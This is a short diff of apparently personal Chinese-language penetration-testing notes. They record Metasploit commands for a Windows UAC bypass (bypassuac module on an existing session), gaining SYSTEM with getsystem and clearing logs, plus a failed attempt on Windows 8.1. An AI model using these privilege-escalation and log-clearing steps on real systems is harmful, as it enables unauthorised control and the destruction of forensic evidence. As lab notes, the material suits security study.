@@ -61,7 +61,7 @@ use exploit/windows/local/bypassuac
 set SESSION 1
 run
 成功得到  session2 
-getsystem 就不报错了  也能清日志  虽然还是这个用户 但权限提高了 
+getsystem 就不报错了  也能清日志  
 在 win8.1 系统中 提权 失败了 并且弹提示框 
 
 还是这个2009-08-26 系统 用另一种方法提权 
